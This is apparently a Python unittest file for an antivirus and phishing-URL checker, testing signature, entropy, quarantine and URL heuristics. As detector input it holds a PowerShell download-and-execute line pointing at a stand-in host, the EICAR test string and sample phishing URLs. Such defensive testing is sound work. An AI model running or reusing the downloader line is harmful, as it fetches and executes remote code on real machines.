import os
import shutil
import tempfile
import unittest
from pathlib import Path

_HOME = tempfile.mkdtemp(prefix="sentinel_test_home_")
os.environ["SENTINEL_HOME"] = _HOME  # must be set before importing the package

from sentinel import config, quarantine, webguard  # noqa: E402
from sentinel.scanner import CLEAN, MALICIOUS, SUSPICIOUS, Scanner, SignatureDB, shannon_entropy  # noqa: E402

# Built at runtime so this source file is not itself flagged by real antivirus products.
EICAR = ("X5O!P%@AP[4\\PZX54(P^)7CC)7}$" + "EICAR-STANDARD-ANTIVIRUS-TEST-FILE!" + "$H+H*").encode()


class ScannerTests(unittest.TestCase):
    def setUp(self):
        self.dir = Path(tempfile.mkdtemp(prefix="sentinel_t_"))
        self.sc = Scanner()

    def tearDown(self):
        shutil.rmtree(self.dir, ignore_errors=True)

    def write(self, name, data):
        p = self.dir / name
        p.write_bytes(data if isinstance(data, bytes) else data.encode())
        return p

    def test_eicar_is_malicious(self):
        r = self.sc.scan_file(self.write("eicar.com.txt", EICAR))
        self.assertEqual(r.verdict, MALICIOUS)

    def test_hash_signature(self):
        p = self.write("bad.bin", "totally-fake-malware-sample")
        sha = self.sc.scan_file(p).sha256
        db = SignatureDB(dirs=[])
        db.hashes[sha] = "Unit-Test-Malware"
        r = Scanner(db).scan_file(p)
        self.assertEqual(r.verdict, MALICIOUS)

    def test_clean_text(self):
        self.assertEqual(self.sc.scan_file(self.write("notes.txt", "hello world")).verdict, CLEAN)

    def test_double_extension(self):
        r = self.sc.scan_file(self.write("invoice.pdf.exe", b"MZ" + b"\x00" * 100))
        self.assertIn(r.verdict, (SUSPICIOUS, MALICIOUS))

    def test_executable_disguised_as_pdf(self):
        r = self.sc.scan_file(self.write("report.pdf", b"MZ" + b"\x00" * 100))
        self.assertEqual(r.verdict, SUSPICIOUS)

    def test_powershell_downloader(self):
        s = "powershell -enc " + "QUJD" * 12 + "\nIEX (New-Object Net.WebClient).DownloadString('http://x.test/a')"
        r = self.sc.scan_file(self.write("run.ps1", s))
        self.assertIn(r.verdict, (SUSPICIOUS, MALICIOUS))

    def test_entropy(self):
        self.assertGreater(shannon_entropy(os.urandom(100000)), 7.5)
        self.assertLess(shannon_entropy(b"abababab" * 1000), 2)

    def test_scan_tree(self):
        self.write("a.txt", "ok")
        self.write("eicar.txt", EICAR)
        results = list(self.sc.scan_tree(self.dir))
        self.assertEqual(len(results), 2)
        self.assertEqual(sum(r.verdict == MALICIOUS for r in results), 1)


class QuarantineTests(unittest.TestCase):
    def test_round_trip(self):
        d = Path(tempfile.mkdtemp())
        f = d / "evil.bin"
        data = os.urandom(3 * (1 << 20) + 123)  # spans several chunks
        f.write_bytes(data)
        qid = quarantine.quarantine_file(f, "test", "abc")
        self.assertFalse(f.exists())
        self.assertNotEqual((config.QUARANTINE_DIR / f"{qid}.qz").read_bytes()[:64], data[:64])
        self.assertEqual(len(quarantine.list_items()), 1)
        out = quarantine.restore(qid)
        self.assertEqual(out.read_bytes(), data)
        self.assertEqual(quarantine.list_items(), [])
        shutil.rmtree(d, ignore_errors=True)


class WebGuardTests(unittest.TestCase):
    def test_legit(self):
        self.assertEqual(webguard.analyze_url("https://www.google.com/search?q=cats").verdict, "clean")
        self.assertEqual(webguard.analyze_url("https://github.com/login").verdict, "clean")

    def test_phishing(self):
        v = webguard.analyze_url("http://paypa1-secure-login.xyz/verify")
        self.assertNotEqual(v.verdict, "clean")

    def test_brand_subdomain(self):
        self.assertNotEqual(webguard.analyze_url("https://paypal.com.account-check.top/").verdict, "clean")

    def test_at_sign(self):
        self.assertNotEqual(webguard.analyze_url("http://192.168.1.1@evil.com/").verdict, "clean")

    def test_ip_login(self):
        self.assertNotEqual(webguard.analyze_url("http://185.1.2.3/login").verdict, "clean")

    def test_punycode_reason(self):
        v = webguard.analyze_url("http://xn--pypal-4ve.com/")
        self.assertTrue(any("Punycode" in r for r in v.reasons))

    def test_blocklist(self):
        self.assertEqual(webguard.analyze_url("http://sentinel-test-bad.test/").verdict, "malicious")


if __name__ == "__main__":
    unittest.main()
